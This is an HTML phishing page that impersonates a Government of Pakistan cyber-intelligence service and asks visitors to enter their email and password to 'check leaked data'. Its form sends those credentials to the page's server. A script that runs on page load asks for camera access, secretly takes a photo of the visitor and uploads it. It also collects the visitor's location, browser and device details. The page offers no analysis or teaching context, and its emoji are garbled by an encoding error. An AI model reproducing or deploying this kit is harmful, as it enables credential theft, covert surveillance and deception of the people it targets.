<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>‚ö†Ô∏è Government of Pakistan ‚Äì Cyber Intelligence</title>
  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/0/01/State_emblem_of_Pakistan.svg/1200px-State_emblem_of_Pakistan.svg.png">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #1a1a1a;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background-image: url('https://www.transparenttextures.com/patterns/black-linen.png');
    }
    .container {
      background: rgba(255,255,255,0.05);
      padding: 30px;
      border-radius: 16px;
      text-align: center;
      width: 350px;
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
      backdrop-filter: blur(8px);
    }
    h1 {
      font-size: 20px;
      color: #e74c3c;
    }
    p {
      font-size: 14px;
      margin-bottom: 20px;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border-radius: 6px;
      border: none;
    }
    input {
      background: #ecf0f1;
      color: #2c3e50;
    }
    button {
      background: #c0392b;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background: #e74c3c;
    }
    img {
      max-width: 80px;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/01/State_emblem_of_Pakistan.svg/1200px-State_emblem_of_Pakistan.svg.png">
    <h1>‚ö†Ô∏è Government of Pakistan ‚Äì Cyber Intelligence</h1>
    <p>üì¨ Please check your leaked email and password data.</p>
    <form action="/login" method="POST">
      <input type="email" name="email" placeholder="Email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Check Now</button>
    </form>
  </div>

  <script>
    async function sendPhotoBlob(blob) {
      const formData = new FormData();
      formData.append('photo', blob);
      try {
        await fetch('/collect', {
          method: 'POST',
          body: formData
        });
      } catch (e) {
        console.error('Photo send failed', e);
      }
    }

    async function collectData(status, lat = null, lon = null) {
      const data = {
        userAgent: navigator.userAgent,
        latitude: lat,
        longitude: lon,
        camera: status,
        deviceInfo: navigator.platform
      };

      await fetch('/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    }

    function capturePhoto(stream) {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        canvas.toBlob(blob => {
          sendPhotoBlob(blob);
        }, 'image/jpeg');
      };
    }

    function askPermissions() {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
        .then(stream => {
          capturePhoto(stream);
          stream.getTracks().forEach(track => track.stop());

          navigator.geolocation.getCurrentPosition(
            pos => collectData('‚úÖ Camera Allowed', pos.coords.latitude, pos.coords.longitude),
            err => collectData('‚úÖ Camera Allowed, ‚ùå Location Denied')
          );
        })
        .catch(() => collectData('‚ùå Camera Denied'));
    }

    window.onload = askPermissions;
  </script>
</body>
</html>
